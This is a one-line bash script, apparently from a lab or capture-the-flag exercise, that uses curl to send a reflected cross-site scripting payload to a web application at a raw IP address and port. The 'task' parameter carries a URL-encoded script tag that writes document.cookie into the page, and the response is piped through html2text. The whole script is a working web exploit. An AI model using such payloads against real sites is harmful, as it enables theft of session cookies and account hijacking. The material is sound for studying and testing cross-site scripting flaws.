#!/bin/bash



curl -s -X GET "http://157.245.32.36:31595/index.php?task=%3Cscript%3Edocument.write(document.cookie)%3C/script%3E" | html2text
